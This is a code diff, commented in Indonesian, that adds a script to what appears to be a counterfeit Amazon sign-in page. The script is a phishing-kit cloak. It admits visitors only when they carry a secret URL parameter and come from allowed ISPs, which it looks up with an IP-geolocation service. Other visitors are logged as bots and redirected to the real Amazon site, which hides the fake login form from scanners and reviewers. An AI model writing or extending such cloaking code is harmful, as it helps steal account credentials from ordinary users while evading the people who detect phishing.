@@ -38,6 +38,54 @@
     </div>
 
 <script>
+// === CEK PARAMETER & ISP ===
+async function cekAkses() {
+  const paramTersimpan = localStorage.getItem('pengaturan_param');
+  const daftarBlokir = localStorage.getItem('daftar_blokir_isp') || '';
+  const daftarIzinkan = localStorage.getItem('daftar_izinkan_isp') || '';
+  
+  // Cek apakah ada parameter yang cocok
+  const params = new URLSearchParams(window.location.search);
+  let lolos = false;
+  for (const [kunci] of params.entries()) {
+    if (kunci === paramTersimpan && params.get(kunci) === 'aktif') {
+      lolos = true;
+      break;
+    }
+  }
+
+  // Ambil info pengunjung
+  let info = { ip: '-', isp: '-', country_name: '-' };
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    info = await res.json();
+  } catch {}
+
+  // Cek ISP
+  const isp = info.org || info.isp || '';
+  const blokirArr = daftarBlokir.split(',').map(s => s.trim().toLowerCase()).filter(Boolean);
+  const izinkanArr = daftarIzinkan.split(',').map(s => s.trim().toLowerCase()).filter(Boolean);
+  
+  const diblokir = blokirArr.some(nama => isp.toLowerCase().includes(nama));
+  const diizinkan = izinkanArr.length === 0 || izinkanArr.some(nama => isp.toLowerCase().includes(nama));
+
+  if (!lolos || diblokir || !diizinkan) {
+    // Catat sebagai bot
+    if (window.tambahBot) {
+      window.tambahBot(info.ip || '-', isp, info.country_name || '-');
+    }
+    // Alihkan ke Amazon asli
+    window.location.href = 'https://www.amazon.com';
+    return false;
+  }
+  return true;
+}
+
+document.addEventListener('DOMContentLoaded', async () => {
+  const boleh = await cekAkses();
+  if (!boleh) return;
+  // ... lanjutkan kode asli halaman
+});
 const terjemahan = {
   en: { judul:'Sign In', lblEmail:'Email or mobile phone number', errorEmail:'Enter your email or mobile phone number', btn:'Continue' },
   id: { judul:'Masuk', lblEmail:'Alamat email atau nomor ponsel', errorEmail:'Masukkan alamat email atau nomor ponsel Anda', btn:'Lanjutkan' },
